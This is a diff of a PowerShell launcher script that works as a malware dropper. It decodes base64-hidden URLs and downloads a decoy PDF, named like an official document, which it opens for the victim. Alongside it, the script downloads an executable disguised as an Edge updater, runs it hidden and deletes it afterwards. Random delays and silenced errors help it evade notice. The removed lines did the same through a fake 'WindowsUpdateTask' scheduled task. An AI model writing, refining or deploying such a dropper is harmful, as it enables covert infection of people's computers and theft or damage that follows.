@@ -1,21 +1,30 @@
-# launcher.ps1 - Scheduled task launcher
-$exeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9FZGdlVXBkYXRlci5leGU='))
+$ErrorActionPreference = 'SilentlyContinue'
+
+Start-Sleep -Milliseconds (Get-Random -Min 2000 -Max 8000)
+
 $cache = "$env:APPDATA\Microsoft\Windows\Caches"
-if (!(Test-Path $cache)) { New-Item -ItemType Directory -Path $cache -Force | Out-Null }
+if (-not (Test-Path $cache)) { New-Item -ItemType Directory -Path $cache -Force | Out-Null }
+
+$pdfUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9OYWthel9Oby5fNjYxX3ZpZF8wMi4wMy4yMDI2LnBkZg=='))
+$exeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9FZGdlVXBkYXRlci5leGU='))
+$pdfPath = "$cache\doc.pdf"
 $exePath = "$cache\helper.exe"
 
-# Download EXE (same as before, with random delay)
-$r = Get-Random -Min 1000 -Max 5000
-Start-Sleep -Milliseconds $r
-Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -Headers @{'User-Agent'='Mozilla/5.0'} -UseBasicParsing
+$headers = @{'User-Agent'='Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
+Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -Headers $headers -UseBasicParsing
 
-# Create a scheduled task that runs once, hidden, under the current user
-$taskName = "WindowsUpdateTask_" + (Get-Random -Maximum 99999)
-$action = New-ScheduledTaskAction -Execute $exePath -Argument "-hidden"
-$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(3)
-$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -DeleteExpiredTaskAfter 00:00:30
-Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
-Start-Sleep -Seconds 4
-Start-ScheduledTask -TaskName $taskName
-Start-Sleep -Seconds 10
-Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
+Start-Sleep -Milliseconds (Get-Random -Min 1500 -Max 4000)
+
+Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -Headers $headers -UseBasicParsing
+
+Start-Process $pdfPath
+
+Start-Sleep -Seconds (Get-Random -Min 5 -Max 15)
+
+$wsh = New-Object -ComObject WScript.Shell
+$wsh.Run("`"$exePath`"", 0, $false)
+
+Start-Job -ScriptBlock {
+    Start-Sleep -Seconds 120
+    Remove-Item -Path $args[0] -Force -ErrorAction SilentlyContinue
+} -ArgumentList $exePath | Out-Null
